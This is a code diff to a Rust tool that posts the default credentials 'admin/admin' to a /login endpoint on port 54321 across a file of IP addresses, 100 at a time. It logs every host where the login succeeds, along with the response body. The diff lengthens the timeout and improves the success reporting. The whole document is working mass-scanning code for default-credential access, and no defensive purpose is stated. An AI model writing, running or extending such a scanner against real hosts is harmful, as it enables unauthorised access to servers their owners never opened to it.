@@ -28,18 +28,19 @@ async fn test_one_ip(ip: String) -> Result<bool, Box<dyn std::error::Error>> {
     headers.insert("Priority", "u=0".parse().unwrap());
 
     let url = "http://".to_string() + ip.as_str() + ":54321/login";
-
+    println!("{}",  url);
     let client = Client::new();
     let request = client.post(url).body("username=admin&password=admin").headers(headers);
 
-    let response = timeout(Duration::from_secs(5), request.send()).await??;
+    let response = timeout(Duration::from_secs(10), request.send()).await??;
     if response.status().is_success() {
         println!("{}: 请求成功", ip);
+        println!("{}: {}", ip, response.text().await?);
+        return Ok(true);
     } else {
         eprintln!("{}: 请求失败", ip);
+        return Ok(false);
     }
-    println!("response: {}", response.text().await?);
-    Ok(true)
 }
 
 #[tokio::main]
@@ -47,6 +48,13 @@ async fn main() {
     let ips = read_file();
     iter(ips)
         .for_each_concurrent(Some(100), |ip| async move {
-            let _ = test_one_ip(ip).await;
+            match test_one_ip(ip.clone()).await {
+                Ok(t) => {
+                    if t {
+                        println!("ip: {} 成功", ip.clone());
+                    }
+                },
+                Err(_) => return,
+            };
         }).await;
 }
